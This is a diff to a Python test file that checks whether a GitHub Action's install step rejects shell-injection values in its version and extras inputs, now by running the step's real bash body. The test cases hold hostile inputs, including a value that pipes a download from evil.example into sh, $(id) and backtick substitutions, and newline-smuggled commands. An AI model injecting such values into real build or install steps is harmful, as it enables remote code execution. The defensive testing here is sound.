@@ -12,7 +12,9 @@ So this is a SWEEP, not a case about one file: every action and every workflow i
 is examined, because a fix that only covers the place the finding named leaves its
 neighbours open — and the neighbour here was one step away.
 """
+import os
 import re
+import subprocess
 import unittest
 from pathlib import Path
 
@@ -135,57 +137,99 @@ class TestKeineEinspeisungInEinenShellBody(unittest.TestCase):
                                   "a value the attacker does not control must not be flagged")
 
 
-# The shape checks are read OUT OF the action, never typed here a second time.
+# The shape check is exercised BY RUNNING IT, not by re-implementing it.
 #
-# An earlier version of this file held its own copies of both patterns. They happened to be
-# character-identical to the ones the step runs, and nothing enforced that. Weaken the pattern in
-# action/action.yml to `^[=<>!~]{1,2}.*$` and leave the two error strings untouched, and every test
-# in this file stays green: the presence check only looks for the message, and the value cases only
-# ever exercised the copy. That is a guarantee about a stand-in instead of about the property.
-_SHAPE_LINE = re.compile(
-    r"""printf\s+'%s'\s+"\$(?P<var>PB_[A-Z]+)"\s*\|\s*grep\s+-Eq\s+'(?P<muster>[^']+)'""")
+# Two earlier versions of this file each got one layer of this wrong. The first held its own typed
+# copies of both patterns: weaken the pattern in the action and leave the error strings alone, and
+# every test stayed green — a guarantee about a stand-in. The second read the patterns out of the
+# action but still applied them with Python's `re`, and that is a DIFFERENT ENGINE from the one the
+# step used. Measured: with the value `==1.0.0` followed by a newline and `"; curl evil.example|sh #`,
+# `grep -Eq '^...$'` returned 0 and accepted it, because grep anchors per line, while `re.search`
+# with the same pattern rejected it. One pattern, two engines, opposite verdicts — and the test
+# reported the engine that was not running.
+#
+# So the tests below execute the step's own `run:` body, with `python` shadowed so no install
+# happens. A refusal is then the step's refusal, measured, and no second implementation of the rule
+# exists to drift.
+_RE_ZEILE = re.compile(r"^\s*(?P<var>PB_[A-Z]+_RE)='(?P<muster>[^']+)'\s*$", re.M)
 
 
-def action_muster() -> dict[str, re.Pattern[str]]:
-    """The patterns the step actually runs, keyed by the variable they guard."""
-    text = (REPO / "action" / "action.yml").read_text(encoding="utf-8")
-    return {m.group("var"): re.compile(m.group("muster"))
-            for m in _SHAPE_LINE.finditer(text)}
+def install_rumpf() -> str:
+    """The `run:` body of the install step, as the runner would execute it."""
+    doc = yaml.safe_load((REPO / "action" / "action.yml").read_text(encoding="utf-8"))
+    for s in doc["runs"]["steps"]:
+        if s.get("name") == "Install proofbundle":
+            return s["run"]
+    raise AssertionError("the install step is gone or was renamed — this file tests nothing")
+
+
+def action_muster() -> dict[str, str]:
+    """The patterns the step declares, keyed by their variable name."""
+    return {m.group("var"): m.group("muster") for m in _RE_ZEILE.finditer(install_rumpf())}
+
+
+def schritt_weist_ab(**werte: str) -> bool:
+    """True when the step REFUSES these inputs. Runs the real body, installs nothing."""
+    rumpf = install_rumpf()
+    # A shell function shadows the command, so `python -m pip install ...` is a no-op and the exit
+    # code carries the verdict of the guard rather than the state of the network.
+    r = subprocess.run(["bash", "-c", "python() { :; }\n" + rumpf],
+                       env={**os.environ, "PB_VERSION": "", "PB_EXTRAS": "", **werte},
+                       capture_output=True, text=True)
+    return r.returncode != 0
 
 
 class TestFormpruefungDerEingaben(unittest.TestCase):
     """env: alone is secure only until someone rewrites the step. The shape check survives."""
 
-    def setUp(self):
-        self.muster = action_muster()
-
     def test_beide_muster_sind_ueberhaupt_auffindbar(self):
-        """Without this the value cases below would pass vacuously over an empty dict."""
-        self.assertEqual(sorted(self.muster), ["PB_EXTRAS", "PB_VERSION"],
-                         "the action does not guard both inputs with a shape check, or the step "
-                         "was rewritten in a form this reader no longer recognises")
+        """Without this the value cases below could pass over a step that checks nothing."""
+        self.assertEqual(sorted(action_muster()), ["PB_EXTRAS_RE", "PB_VERSION_RE"],
+                         "the step no longer declares both shape patterns, or it was rewritten in "
+                         "a form this reader does not recognise")
 
     def test_die_action_prueft_beide_eingaben_auf_ihre_form(self):
-        text = (REPO / "action" / "action.yml").read_text(encoding="utf-8")
-        self.assertIn("is not a PEP 440 specifier", text)
-        self.assertIn("is not a comma-separated list of names", text)
+        rumpf = install_rumpf()
+        self.assertIn("is not a PEP 440 specifier", rumpf)
+        self.assertIn("is not a comma-separated list of names", rumpf)
 
-    def test_die_erlaubten_formen_nehmen_echte_werte_an(self):
-        for gut in ("==6.0.0", ">=6.0", "~=6.0.1", "==6.0.0rc1"):
-            with self.subTest(v=gut):
-                self.assertRegex(gut, self.muster["PB_VERSION"])
-        for gut in ("eval", "eval,inspect", "dev-tools"):
-            with self.subTest(e=gut):
-                self.assertRegex(gut, self.muster["PB_EXTRAS"])
+    def test_echte_werte_kommen_durch(self):
+        """A guard that refuses everything is not a guard, it is an outage."""
+        for gut in ("==6.0.0", ">=6.0", "~=6.0.1", "==6.0.0rc1", "==1.*", ""):
+            with self.subTest(version=gut):
+                self.assertFalse(schritt_weist_ab(PB_VERSION=gut),
+                                 f"the step refuses the legitimate version {gut!r}")
+        for gut in ("eval", "eval,inspect", "dev-tools", ""):
+            with self.subTest(extras=gut):
+                self.assertFalse(schritt_weist_ab(PB_EXTRAS=gut),
+                                 f"the step refuses the legitimate extras {gut!r}")
 
-    def test_die_erlaubten_formen_weisen_die_einspeisung_ab(self):
+    def test_die_einspeisung_wird_abgewiesen(self):
         for boese in ('==1.0.0"; curl evil.example/x | sh; echo "',
-                      "==1.0.0 $(id)", "==1.0.0`id`", "; id", "==1.0.0\nid"):
-            with self.subTest(v=boese):
-                self.assertNotRegex(boese, self.muster["PB_VERSION"])
+                      "==1.0.0 $(id)", "==1.0.0`id`", "; id"):
+            with self.subTest(version=boese):
+                self.assertTrue(schritt_weist_ab(PB_VERSION=boese))
         for boese in ("eval; id", "eval$(id)", "eval inspect", "eval,"):
-            with self.subTest(e=boese):
-                self.assertNotRegex(boese, self.muster["PB_EXTRAS"])
+            with self.subTest(extras=boese):
+                self.assertTrue(schritt_weist_ab(PB_EXTRAS=boese))
+
+    def test_ein_wert_dessen_ERSTE_zeile_passt_kommt_nicht_durch(self):
+        """The line-wise anchor. `grep -Eq '^...$'` accepted every one of these."""
+        for boese in ('==1.0.0\n"; curl evil.example/x | sh #',
+                      "==1.0.0\nid",
+                      "==1.0.0\n\n$(id)"):
+            with self.subTest(version=boese):
+                self.assertTrue(schritt_weist_ab(PB_VERSION=boese),
+                                "a value whose first line matches is still not the value")
+        for boese in ("eval\nwhatever$(id)", "eval\n; id"):
+            with self.subTest(extras=boese):
+                self.assertTrue(schritt_weist_ab(PB_EXTRAS=boese))
+
+    def test_ein_extra_faengt_nicht_mit_einem_bindestrich_an(self):
+        """`-e` and `--no-deps` read as options, and an extras list admits neither."""
+        for boese in ("-e", "eval,--no-deps", "-", "_eval"):
+            with self.subTest(extras=boese):
+                self.assertTrue(schritt_weist_ab(PB_EXTRAS=boese))
 
 
 if __name__ == "__main__":
